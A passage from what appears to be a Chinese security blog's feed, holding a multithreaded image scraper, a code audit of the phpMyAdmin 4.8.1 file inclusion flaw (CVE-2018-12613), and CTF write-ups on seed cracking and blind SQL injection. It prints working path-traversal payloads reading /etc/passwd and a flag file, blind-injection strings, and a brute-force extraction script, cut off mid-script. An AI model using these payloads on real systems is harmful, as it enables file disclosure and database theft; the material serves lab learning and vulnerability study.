class="line">admin&#39;%2b(ascii(mid((passwd)from(1)))&#x3D;48)%2b&#39;</span><br></pre></td></tr></table></figure><br>通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。<br>最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/6.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;从
      
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>多线程爬取表情包</title>
    <link href="https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html"/>
    <id>https://da4er.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html</id>
    <published>2020-02-23T11:01:54.000Z</published>
    <updated>2020-02-23T11:02:20.841Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;通过threading库加上queue的安全队列进行了一次对表情包网的爬出。&lt;/strong&gt;&lt;br&gt;代码如下：&lt;br&gt;使用了消
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>代码审计_phpmyadmin4.8.1后台文件包含漏洞(CVE-2018-12613)</title>
    <link href="https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html"/>
    <id>https://da4er.top/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html</id>
    <published>2020-02-17T13:46:13.000Z</published>
    <updated>2020-02-17T13:47:27.265Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">下载地址</a></p><p>漏洞出现在index.php页面中的55~63行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p><p>看一下$target_blacklist：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><br>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><br>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><br>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：<br><img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;漏洞影响范围：phpmyadmin4.8.0 4.8.1&lt;br&gt;漏洞类型：后台任意文件包含&lt;br&gt;&lt;a href=&quot;https://files.
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2.17 [GWCTF 2019]枯燥的抽奖&amp;我有一个数据库</title>
    <link href="https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <id>https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <published>2020-02-17T12:24:28.000Z</published>
    <updated>2020-02-17T12:28:45.241Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er"><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er"><br>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er"><br>然后用php_mt_seed爆破：<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er"><br>得到的随机数直接用下面的脚本进行获取全面字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er"><br>将这段字符串提交得到flag。<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er"></p><hr><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;枯燥的抽奖&quot;&gt;&lt;a href=&quot;#枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;枯燥的抽奖&quot;&gt;&lt;/a&gt;枯燥
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.16 [极客大挑战 2019]FinalSQL</title>
    <link href="https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html"/>
    <id>https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html</id>
    <published>2020-02-16T12:28:37.000Z</published>
    <updated>2020-02-16T12:29:07.413Z</updated>
    
    <content type="html"><![CDATA[<p>检测通过测试发现在search.php页面存在sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><br>先写个判断数据库名的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            